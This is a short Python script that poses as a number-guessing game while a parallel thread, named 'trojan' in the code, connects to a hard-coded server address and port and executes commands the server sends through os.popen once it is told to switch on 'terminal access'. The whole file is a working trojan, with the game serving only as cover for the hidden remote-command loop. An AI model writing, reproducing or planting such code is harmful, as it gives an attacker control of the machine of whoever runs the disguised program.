import random
import socket
import threading
import os

def trojan():  #Set the Server
    HOST = '192.168.110.1'
    PORT = 9090

    client = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))

    #Starting for Controlling CMD
    cmd_mode = False

    while True:
        server_command = client.recv(1024).decode('utf-8')
        if server_command == 'cmond': #Tuen on cmd
            cmd_mode = True
            client.send("You now have terminal access! ".encode('utf-8'))
            continue
        if server_command == "cmdoff":
            cmd_mode = False
        if cmd_mode:
            os.popen(server_command)
        else:
            if server_command == "Hello":
                print("Hello World!")
            client.send(f"{server_command} was executed successfully!".encode('utf-8'))

def game():  #Guessing Game
    number = random.randint(0, 1000)
    tries = 1
    done = False

    while not done:
        guess = int (input("Enter a guess: "))

        if guess == number:
            done = True
            print("Congratulations, you Won!")

        else:
            tries += 1
            if guess > number:
                print("The number is smaller!")
            else:
                print("The number is larger! ")

    print(f"You neeeded  {tries} tries!") #End Game

t1 = threading.Thread(target=game)
t2 = threading.Thread(target=trojan)

t1.start()
t2.start()